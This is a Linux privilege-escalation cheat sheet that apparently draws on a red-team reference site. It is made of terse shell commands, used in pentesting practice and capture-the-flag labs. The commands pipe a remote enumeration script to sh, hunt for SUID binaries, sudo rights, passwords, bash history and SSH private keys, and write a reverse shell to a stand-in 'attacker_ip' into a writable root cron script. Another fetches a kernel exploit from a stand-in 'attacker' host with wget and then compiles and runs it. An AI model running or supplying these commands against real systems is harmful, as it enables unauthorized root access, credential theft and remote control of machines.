https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/#summary
### Linpeas Oneliner
``` bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
#give execute permission with:
chmod +x .linpeas.sh
#Run linpeas
./linpeas.sh
```
### Initial Enumeration
``` bash
uname -a                    # Kernel version
id                          # User and group info
sudo -l                     # Sudo permissions
whoami                      # Current user
hostname                    # Hostname
ps aux                      # Running processes
env                         # Environment variables
```
### File System & Permissions
``` bash
find / -perm -u=s -type f 2>/dev/null          # SUID binaries
find / -perm -g=s -type f 2>/dev/null          # SGID binaries
find / -writable -type d 2>/dev/null           # Writable directories
ls -la /etc/passwd /etc/shadow                 # Check permissions
```
### Credentials and Misconfigs
``` bash
grep -r "password" /etc/ 2>/dev/null
find / -name "*.conf" -o -name "*.env" 2>/dev/null
cat ~/.bash_history
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```
### 'The ol' reliable' - Exploitable Sudo Permissions
``` bash
sudo -l
#Check for allowed commands look for these
#(sudo) /bin/bash              # Instant root
#(sudo) python / python3       # Run shell
#(sudo) find                   # Escalation
#(sudo) less / vi / nano       # Shell escape
#Use GTFOBins to find escalation paths
```
### SUID Binaries
``` bash
find / -perm -4000 -type f 2>/dev/null
#Common exploitable binaries:
#/usr/bin/nmap
#/usr/bin/vim
#/usr/bin/find
#/usr/bin/perl
#/usr/bin/python
#Use GTFOBins to abuse them
```
### CRON Jobs
``` bash
ls -la /etc/cron* /var/spool/cron/crontabs
#Look for:
#Writable scripts
#Scheduled jobs running as root   
#If a cron job runs a script from a writable location:
echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" > /path/to/script
```
### Exploiting Services
``` bash
#Check running services
netstat -tulnp 
ps aux | grep root
#Misconfigured services (e.g., MySQL, Apache) running as root may allow code injection or privilege escalation.
```
### Kernel Exploits
``` bash
uname -r
#Easier to check with linpeas or Linux Exploit Suggester
#Download exploit and run
wget http://attacker/dirty.c
gcc dirty.c -o dirty
./dirty
```
### SSH Keys
``` bash
ls -la /home /root /etc/ssh /home/*/.ssh/; 
locate id_rsa; 
locate id_dsa; 
find / -name id_rsa 2> /dev/null; 
find / -name id_dsa 2> /dev/null; 
find / -name authorized_keys 2> /dev/null; 
cat /home/*/.ssh/id_rsa; cat /home/*/.ssh/id_dsa
```
